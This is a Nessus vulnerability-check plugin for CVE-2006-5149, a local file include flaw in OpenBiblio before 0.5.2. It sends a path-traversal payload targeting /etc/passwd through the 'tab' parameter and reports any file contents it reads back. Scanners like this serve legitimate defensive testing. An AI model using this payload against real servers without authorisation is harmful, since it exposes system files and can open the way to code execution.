#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple local file include issues. 

Description :

The remote host is running OpenBiblio, a free, automated library
system written in PHP. 

The version of OpenBiblio installed on the remote host fails to
sanitize user-supplied input to the 'tab' and 'page' parameters of the
'shared/header.php' and 'shared/help.php' scripts respectively before
using it to include PHP code.  An unauthenticated remote attacker may
be able to exploit these issues to view arbitrary files or to execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id. 

See also :

http://sourceforge.net/project/shownotes.php?release_id=451780

Solution :

Upgrade to OpenBiblio 0.5.2 or later. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(22496);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-5149");
  script_bugtraq_id(20301);

  script_name(english:"OpenBiblio < 0.5.2 Multiple Local File Include Vulnerabilities");
  script_summary(english:"Tries to read a local file in OpenBiblio");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/openbiblio", "/library", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Grab index.php.
  file = "../../../../../../../../../../etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/shared/header.php?",
      "tab=", file
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (
    "OpenBiblio Library Automation System" >< res &&
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or...
      string("main(../navbars/", file, "\\0.php): failed to open stream") >< res ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
  )
  {
    contents = NULL;
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = strstr(res, 'font  class="alt1">');
      if (contents) contents = contents - 'font  class="alt1">';
      if (contents) contents = contents - "      ";
      if (contents) contents = contents - strstr(contents, '</font>');
    }

    if (contents && report_verbosity)
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
